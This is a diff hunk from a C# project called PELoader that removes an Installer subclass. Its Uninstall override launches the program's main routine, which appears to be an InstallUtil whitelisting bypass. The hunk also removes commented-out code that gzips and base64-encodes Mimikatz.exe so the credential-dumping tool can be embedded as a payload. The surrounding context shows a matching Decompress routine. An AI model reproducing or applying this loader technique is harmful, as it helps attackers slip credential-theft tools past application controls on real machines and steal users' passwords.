@@ -29,40 +29,6 @@ License: BSD 3-Clause
  
 namespace PELoader
 {
-    [System.ComponentModel.RunInstaller(true)]
-    public class Sample : System.Configuration.Install.Installer
-    {
-        public static byte[] Compress(byte[] raw)
-        {
-            using (MemoryStream memory = new MemoryStream())
-            {
-                using (GZipStream gzip = new GZipStream(memory,
-                CompressionMode.Compress, true))
-                {
-                gzip.Write(raw, 0, raw.Length);
-                }
-                return memory.ToArray();
-            }
-        }
-         
-     
-     
-        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
-        public override void Uninstall(System.Collections.IDictionary savedState)
-        {
-            /*
-            byte[] AsBytes = File.ReadAllBytes(@"C:\Tools\Mimikatz.exe");
-            byte[] compress = Compress(AsBytes);
-            String AsBase64String = Convert.ToBase64String(compress);
-            StreamWriter sw = new StreamWriter(@"C:\Tools\Mimikatz.b64");
-            sw.Write(AsBase64String);
-            sw.Close();
-            */
-            Program.Main();
-             
-        }
- 
-    }
     class Program
     {
         static byte[] Decompress(byte[] gzip)
